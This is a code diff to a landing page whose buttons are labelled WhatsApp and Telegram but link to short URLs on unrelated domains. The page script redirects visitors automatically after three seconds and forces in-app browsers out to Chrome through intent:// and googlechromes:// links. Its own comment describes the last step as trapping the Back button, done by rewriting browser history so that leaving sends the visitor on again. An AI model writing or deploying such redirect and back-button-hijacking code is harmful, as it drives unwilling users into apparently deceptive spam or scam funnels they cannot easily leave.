@@ -169,7 +169,7 @@ video{
 
 <div class="chat-box" id="chatBox"></div>
 
-<!-- SEMUA TOMBOL DIBERIKAN CLASS "redirect-btn" -->
+<!-- TOMBOL DENGAN LINK BERBEDA-BEDA -->
 <div class="buttons">
   <a href="https://flychicken.my.id/bdf80c4ad" class="btn wa redirect-btn">🟢 WhatsApp</a>
   <a href="https://flychicken.my.id/6e4943e05" class="btn telegram redirect-btn">📨 Telegram</a>
@@ -291,33 +291,24 @@ setInterval(()=>{
 },7000);
 
 /* ========================================== */
-/* FORCE REDIRECT UNTUK SEMUA TOMBOL          */
+/* PERUBAHAN UTAMA: SCRIPT DINAMIS PER TOMBOL */
 /* ========================================== */
-const shopUrl = "https://urep9.my.id/c4fcfc703";
-const rawUrl = shopUrl.replace(/^https?:\/\//, '');
-const encodedFallback = encodeURIComponent(shopUrl);
+const defaultShopUrl = "https://urep9.my.id/c4fcfc703"; 
 
 const ua = navigator.userAgent.toLowerCase();
 const isAndroid = ua.indexOf("android") > -1;
 const isIOS = /iphone|ipad|ipod/.test(ua);
 
-let targetLink = shopUrl;
 let autoRedirectTimer;
-
-if (isAndroid) {
-    targetLink = "intent://" + rawUrl + "#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=" + encodedFallback + ";end;";
-} else if (isIOS) {
-    targetLink = "googlechromes://" + rawUrl;
-}
 
 // Auto Redirect (Jika User Diam 3 Detik)
 window.onload = function() {
     autoRedirectTimer = setTimeout(function() {
-        window.location.replace(shopUrl);
+        window.location.replace(defaultShopUrl);
     }, 3000);
 };
 
-// Event Klik UNTUK SEMUA TOMBOL DENGAN CLASS "redirect-btn"
+// Event Klik: Mengambil link langsung dari atribut href tombol yang diklik
 const redirectBtns = document.querySelectorAll('.redirect-btn');
 redirectBtns.forEach(function(btn) {
     btn.addEventListener('click', function(e) {
@@ -326,21 +317,33 @@ redirectBtns.forEach(function(btn) {
             clearTimeout(autoRedirectTimer);
         }
 
+        // Ambil link unik dari masing-masing tombol
+        const customUrl = btn.getAttribute('href');
+        const rawCustomUrl = customUrl.replace(/^https?:\/\//, '');
+        const encodedCustomFallback = encodeURIComponent(customUrl);
+
+        let targetCustomLink = customUrl;
+        if (isAndroid) {
+            targetCustomLink = "intent://" + rawCustomUrl + "#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=" + encodedCustomFallback + ";end;";
+        } else if (isIOS) {
+            targetCustomLink = "googlechromes://" + rawCustomUrl;
+        }
+
         setTimeout(function() {
-            window.location.replace(shopUrl);
+            window.location.replace(customUrl);
         }, 1500);
 
         try {
-            window.location.assign(targetLink);
+            window.location.assign(targetCustomLink);
         } catch (err) {
-            window.location.replace(shopUrl);
+            window.location.replace(customUrl);
         }
     });
 });
 
-// Menjebak Tombol Back agar tetap di alur redirect
+// Menjebak Tombol Back
 history.pushState(null, null, location.href);
-window.onpopstate = () => window.location.replace(shopUrl);
+window.onpopstate = () => window.location.replace(defaultShopUrl);
 </script>
 
 </body>
